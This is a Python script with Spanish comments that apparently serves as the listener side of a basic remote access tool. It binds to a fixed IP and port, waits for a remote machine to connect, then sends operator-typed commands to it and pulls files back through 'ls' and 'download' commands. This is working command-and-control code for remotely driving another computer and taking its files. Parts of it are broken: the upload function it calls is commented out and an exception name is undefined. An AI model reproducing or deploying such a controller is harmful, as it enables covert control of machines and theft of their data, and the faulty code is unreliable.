###19/04

import os
import time

import struct
import socket
host = "10.9.147.126"
port = 4894
def recibir_p(filename):
    f = open(filename, "wb")
    
    while True:
        try:
            # Recibir datos del cliente.
            input_data = conn.recv(1024)
        except error:
            print("Error de lectura.")
            break
        else:
            if input_data:
                # Compatibilidad con Python 3.
                if isinstance(input_data, bytes):
                    end = input_data[0] == 1
                else:
                    end = input_data == chr(1)
                if not end:
                    # Almacenar datos.
                    f.write(input_data)
                else:
                    break
    
    print("El archivo se ha recibido correctamente.")
    f.close()
#fkdjfsdfj
#def send_file(conn, filename):
     # filesize = os.path.getsize(filename)
    #  conn.send(struct.pack("<Q", filesize))

   #   with open(filename, "rb") as f:
  #          while read_bytes := f.read(4096):
 #             conn.send(read_bytes)

#def receive_file_size(sck: socket.socket):

    #fmt = "<Q"
    #expected_bytes = struct.calcsize(fmt)
    #received_bytes = 0
    #stream = bytes()
    #while received_bytes < expected_bytes:
     #   chunk = sck.recv(expected_bytes - received_bytes)
    #    stream += chunk
   #     received_bytes += len(chunk)
  #  filesize = struct.unpack(fmt, stream)[0]
 #   return filesize


#def receive_file(sck: socket.socket, filename):
    #filesize = receive_file_size(sck)
   # with open(filename, "wb") as f:
     #   received_bytes = 0
    #    while received_bytes < filesize:
   #         chunk = sck.recv(4096)
  #          if chunk:
 #               f.write(chunk)
#                received_bytes += len(chunk)



def recibir (filename):
   f = open(filename, "wb")
   while True:
       print("hola")
       data=conn.recv(1024)
       f.write(data)
       if data.decode("UTF-8") == "a":
          break
          f.close()

     

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ("Socket Created")
sock.bind((host, port))
print ("socket bind complete")
sock.listen(1)
conn, addr = sock.accept() 
print('Conexión con {}.'.format(addr))

ruta=conn.recv(4096).decode("UTF-8")
while True:
    time.sleep(1)
    orden=input(f"{ruta} ")
    if orden == "":
        conn.send("null".encode("UTF-8"))
        print("command no found ")
    else:
        conn.send(orden.encode("UTF-8"))
    if orden.split(" ")[0] == "ls":
      data= conn.recv(4096).decode("UTF-8")
      print(data)
    elif orden.split(" ")[0]== "download": 
         recibir_p(orden.split(" ")[2] )
    elif orden.split(" ")[0]== "upload":
        try:
         send_file(conn,orden.split(" ")[1])
        except:
          break
    elif orden == "exit":
        break
    ruta=conn.recv(4096).decode("UTF-8")



